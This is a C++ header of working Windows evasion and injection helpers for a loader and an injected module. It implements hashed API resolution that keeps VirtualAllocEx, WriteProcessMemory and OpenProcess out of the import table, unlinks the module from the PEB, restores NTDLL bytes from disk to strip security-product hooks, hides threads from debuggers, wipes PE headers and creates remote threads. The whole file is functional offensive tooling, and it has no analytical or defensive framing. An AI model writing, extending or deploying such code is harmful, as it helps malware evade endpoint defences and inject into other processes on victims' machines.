// UPGRADE: 0-1 (UnlinkFromPEB), 0-2 (WipePeHeaders call site lives in dllmain.cpp)
#pragma once

// Lightweight, header-only evasion helpers shared by the loader and the
// injected module:
//   * compile-time FNV-1a API hashing
//   * PEB / export-table resolution (no GetProcAddress by name)
//   * PEB unlinking
//   * NTDLL prologue restoration (removes user-mode inline hooks)
//   * thread hiding via NtSetInformationThread
//   * PE header cloaking

#include <windows.h>
#include <winternl.h>
#include <intrin.h>

#include <cstdint>
#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <string>

namespace evasion {

// ---------------------------------------------------------------- hashing
constexpr uint32_t HashStr(const char* text) {
    uint32_t hash = 2166136261u;
    while (*text) {
        hash ^= static_cast<uint8_t>(*text++);
        hash *= 16777619u;
    }
    return hash;
}

// ---------------------------------------------------------------- PEB walk
struct LdrListEntry {
    LdrListEntry* Flink;
    LdrListEntry* Blink;
};

struct LdrUnicodeString {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
};

struct LdrModuleEntry {
    LdrListEntry InLoadOrderLinks;
    LdrListEntry InMemoryOrderLinks;
    LdrListEntry InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    LdrUnicodeString FullDllName;
    LdrUnicodeString BaseDllName;
};

struct LdrData {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LdrListEntry InLoadOrderModuleList;
    LdrListEntry InMemoryOrderModuleList;
    LdrListEntry InInitializationOrderModuleList;
};

struct PebView {
    BYTE Reserved1[0x18];
    LdrData* Ldr;
};

inline uint32_t HashModuleName(USHORT byteLength, const wchar_t* buffer) {
    uint32_t hash = 2166136261u;
    if (!buffer) return 0;
    const int count = byteLength / static_cast<int>(sizeof(wchar_t));
    for (int i = 0; i < count; ++i) {
        wchar_t c = buffer[i];
        if (c >= L'A' && c <= L'Z') {
            c = static_cast<wchar_t>(c + 32);
        }
        hash ^= static_cast<uint8_t>(c & 0xFF);
        hash *= 16777619u;
    }
    return hash;
}

// ------------------------------------------------------- PEB unlink (0-1)
// Unlinks the module from all three PEB loader lists. A manually mapped image
// is usually absent from these lists already, but this is safe to call and
// removes it if any path ever links it back in.
inline void UnlinkFromPEB(PVOID moduleBase) {
    // H-8: wrap PEB walk in SEH — a corrupted list must not crash the loader.
    __try {
        auto* peb = reinterpret_cast<PebView*>(__readgsqword(0x60));
        if (!peb || !peb->Ldr) return;

        LdrListEntry* head = &peb->Ldr->InMemoryOrderModuleList;
        for (LdrListEntry* it = head->Flink; it && it != head; it = it->Flink) {
            auto* entry = reinterpret_cast<LdrModuleEntry*>(
                reinterpret_cast<BYTE*>(it) - offsetof(LdrModuleEntry, InMemoryOrderLinks));
            if (entry->DllBase != moduleBase) {
                continue;
            }
            // Only link-entries inside the LdrData lists are valid targets; bail on corruption.
            if (!entry->InLoadOrderLinks.Flink || !entry->InLoadOrderLinks.Blink ||
                !entry->InMemoryOrderLinks.Flink || !entry->InMemoryOrderLinks.Blink ||
                !entry->InInitializationOrderLinks.Flink || !entry->InInitializationOrderLinks.Blink) {
                return;
            }
            entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
            entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
            entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
            entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
            entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
            entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
            return;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        // Corrupted PEB list — abort unlink gracefully, do not crash.
    }
}

inline PVOID GetModuleBaseByHash(uint32_t nameHash) {
    // H-8: SEH-guarded PEB walk.
    __try {
        auto* peb = reinterpret_cast<PebView*>(__readgsqword(0x60));
        if (!peb || !peb->Ldr) return nullptr;

        LdrListEntry* head = &peb->Ldr->InMemoryOrderModuleList;
        for (LdrListEntry* it = head->Flink; it && it != head; it = it->Flink) {
            auto* entry = reinterpret_cast<LdrModuleEntry*>(
                reinterpret_cast<BYTE*>(it) - offsetof(LdrModuleEntry, InMemoryOrderLinks));
            if (HashModuleName(entry->BaseDllName.Length, entry->BaseDllName.Buffer) == nameHash) {
                return entry->DllBase;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        // Corrupted PEB list — return null rather than crashing.
    }
    return nullptr;
}

inline PVOID GetNtdllBase() {
    return GetModuleBaseByHash(HashStr("ntdll.dll"));
}

// -------------------------------------------------------------- EAT lookup
inline PVOID GetExportByHash(PVOID moduleBase, uint32_t nameHash) {
    // H-8: SEH-guarded export walk — corrupted PE headers must not crash.
    __try {
        if (!moduleBase) return nullptr;

        auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(moduleBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

        auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
            reinterpret_cast<BYTE*>(moduleBase) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        const IMAGE_DATA_DIRECTORY& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!dir.VirtualAddress || !dir.Size) return nullptr;

        auto* exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
            reinterpret_cast<BYTE*>(moduleBase) + dir.VirtualAddress);

        auto* names = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(moduleBase) + exports->AddressOfNames);
        auto* ordinals = reinterpret_cast<WORD*>(reinterpret_cast<BYTE*>(moduleBase) + exports->AddressOfNameOrdinals);
        auto* functions = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(moduleBase) + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
            const char* name = reinterpret_cast<const char*>(reinterpret_cast<BYTE*>(moduleBase) + names[i]);
            if (HashStr(name) == nameHash) {
                const WORD ordinal = ordinals[i];
                if (ordinal < exports->NumberOfFunctions) {
                    return reinterpret_cast<BYTE*>(moduleBase) + functions[ordinal];
                }
                return nullptr;
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        // Corrupted export table — return null.
    }
    return nullptr;
}

inline PVOID ResolveNt(const char* functionName) {
    return GetExportByHash(GetNtdllBase(), HashStr(functionName));
}

inline bool ResolveNtRva(const char* functionName, DWORD* rva) {
    PVOID address = ResolveNt(functionName);
    PVOID base = GetNtdllBase();
    if (!address || !base || !rva) return false;
    *rva = static_cast<DWORD>(reinterpret_cast<BYTE*>(address) - reinterpret_cast<BYTE*>(base));
    return true;
}

// ------------------------------------------------------- NTDLL unhooking
inline DWORD FileRvaToRaw(const std::uint8_t* file, DWORD rva) {
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(file);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(file + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    const IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].SizeOfRawData) {
            return sections[i].PointerToRawData + (rva - sections[i].VirtualAddress);
        }
    }
    return 0;
}

inline std::uint8_t* ReadFileToBuffer(const wchar_t* path, DWORD* sizeOut) {
    HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) return nullptr;

    LARGE_INTEGER size = {};
    if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0 || size.QuadPart > 0x10000000) {
        CloseHandle(file);
        return nullptr;
    }

    auto* buffer = static_cast<std::uint8_t*>(malloc(static_cast<size_t>(size.QuadPart)));
    if (!buffer) {
        CloseHandle(file);
        return nullptr;
    }

    DWORD read = 0;
    if (!ReadFile(file, buffer, static_cast<DWORD>(size.QuadPart), &read, nullptr) || read == 0) {
        free(buffer);
        CloseHandle(file);
        return nullptr;
    }

    CloseHandle(file);
    if (sizeOut) *sizeOut = read;
    return buffer;
}

// Restores the first bytes of critical NTDLL functions from an on-disk copy,
// which removes user-mode inline hooks without re-mapping the whole image.
inline void UnhookNtdll() {
    static const char* kFunctions[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtCreateThreadEx",
        "NtSetInformationThread",
        "NtCreateSection",
        "NtMapViewOfSection",
    };

    PVOID ntdll = GetNtdllBase();
    if (!ntdll) return;

    // N-H-9: resolve system directory instead of hardcoding C:\Windows\System32\.
    wchar_t sysDir[MAX_PATH] = {};
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) return;
    std::wstring ntdllPath = sysDir;
    ntdllPath += L"\\ntdll.dll";

    DWORD fileSize = 0;
    std::uint8_t* file = ReadFileToBuffer(ntdllPath.c_str(), &fileSize);
    if (!file) return;

    for (const char* name : kFunctions) {
        DWORD rva = 0;
        if (!ResolveNtRva(name, &rva)) continue;

        DWORD raw = FileRvaToRaw(file, rva);
        if (!raw || raw + 64 > fileSize) continue;

        auto* target = reinterpret_cast<std::uint8_t*>(ntdll) + rva;
        // N-H-10: compare 64 bytes instead of 32 to catch longer hooks.
        if (memcmp(target, file + raw, 64) == 0) continue;

        DWORD oldProtect = 0;
        if (VirtualProtect(target, 64, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy(target, file + raw, 64);
            DWORD ignored = 0;
            VirtualProtect(target, 64, PAGE_EXECUTE_READ, &ignored);
        }
    }

    free(file);
}

// ----------------------------------------------------------- thread hiding
using NtSetInformationThreadFn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);
using NtCreateThreadExFn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

__declspec(noinline) inline bool HideCurrentThread() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;

    auto fn = reinterpret_cast<NtSetInformationThreadFn>(GetProcAddress(ntdll, "NtSetInformationThread"));
    if (!fn) return false;

    constexpr ULONG ThreadHideFromDebugger = 0x11;
    NTSTATUS status = fn(GetCurrentThread(), ThreadHideFromDebugger, nullptr, 0);
    return status >= 0;
}

// ----------------------------------------------------------- PE cloaking
inline void WipePeHeaders(PVOID moduleBase) {
    if (!moduleBase) return;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(moduleBase);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<BYTE*>(moduleBase) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    if (headerSize == 0) return; // no headers to wipe — bail rather than guessing 0x1000
    // H-7: never wipe more than SizeOfHeaders exactly; don't clamp up to 0x1000
    // which would clobber .text/.rdata when SizeOfHeaders < 0x1000.

    DWORD oldProtect = 0;
    if (VirtualProtect(moduleBase, headerSize, PAGE_READWRITE, &oldProtect)) {
        memset(moduleBase, 0, headerSize);
        DWORD ignored = 0;
        // Restore the ORIGINAL protection, not hardcoded PAGE_READONLY.
        VirtualProtect(moduleBase, headerSize, oldProtect, &ignored);
    }
}

// ------------------------------------------------- NtCreateThreadEx helper
inline HANDLE CreateRemoteThreadHashed(HANDLE process, PVOID start, PVOID parameter) {
    auto fn = reinterpret_cast<NtCreateThreadExFn>(ResolveNt("NtCreateThreadEx"));
    if (!fn) return nullptr;

    HANDLE thread = nullptr;
    NTSTATUS status = fn(&thread, THREAD_ALL_ACCESS, nullptr, process,
        start, parameter, 0, 0, 0, 0, nullptr);
    if (status < 0 || !thread) return nullptr;
    return thread;
}

// -------------------------------------------------- hashed memory/process APIs
// These wrappers resolve KernelBase exports by hash instead of relying on the
// loader's import table, so VirtualAllocEx / WriteProcessMemory / OpenProcess
// no longer appear as named imports.
template <typename Fn>
inline Fn ResolveKernelBase(const char* functionName) {
    static PVOID kernelBase = GetModuleBaseByHash(HashStr("kernelbase.dll"));
    return reinterpret_cast<Fn>(GetExportByHash(kernelBase, HashStr(functionName)));
}

using VirtualAllocExFn = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
using VirtualFreeExFn = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
using VirtualProtectExFn = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
using ReadProcessMemoryFn = BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, PSIZE_T);
using WriteProcessMemoryFn = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
using OpenProcessFn = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);

inline LPVOID EvasionVirtualAllocEx(HANDLE process, LPVOID address, SIZE_T size, DWORD allocationType, DWORD protect) {
    static auto fn = ResolveKernelBase<VirtualAllocExFn>("VirtualAllocEx");
    return fn ? fn(process, address, size, allocationType, protect) : nullptr;
}

inline BOOL EvasionVirtualFreeEx(HANDLE process, LPVOID address, SIZE_T size, DWORD freeType) {
    static auto fn = ResolveKernelBase<VirtualFreeExFn>("VirtualFreeEx");
    return fn ? fn(process, address, size, freeType) : FALSE;
}

inline BOOL EvasionVirtualProtectEx(HANDLE process, LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect) {
    static auto fn = ResolveKernelBase<VirtualProtectExFn>("VirtualProtectEx");
    return fn ? fn(process, address, size, newProtect, oldProtect) : FALSE;
}

inline BOOL EvasionReadProcessMemory(HANDLE process, LPCVOID address, LPVOID buffer, SIZE_T size, PSIZE_T read) {
    static auto fn = ResolveKernelBase<ReadProcessMemoryFn>("ReadProcessMemory");
    return fn ? fn(process, address, buffer, size, read) : FALSE;
}

inline BOOL EvasionWriteProcessMemory(HANDLE process, LPVOID address, LPCVOID buffer, SIZE_T size, PSIZE_T written) {
    static auto fn = ResolveKernelBase<WriteProcessMemoryFn>("WriteProcessMemory");
    return fn ? fn(process, address, buffer, size, written) : FALSE;
}

inline HANDLE EvasionOpenProcess(DWORD access, BOOL inherit, DWORD processId) {
    static auto fn = ResolveKernelBase<OpenProcessFn>("OpenProcess");
    return fn ? fn(access, inherit, processId) : nullptr;
}

using NtCloseFn = NTSTATUS(NTAPI*)(HANDLE);

inline NTSTATUS EvasionNtClose(HANDLE handle) {
    static auto fn = reinterpret_cast<NtCloseFn>(ResolveNt("NtClose"));
    return fn ? fn(handle) : STATUS_INVALID_HANDLE;
}

} // namespace evasion
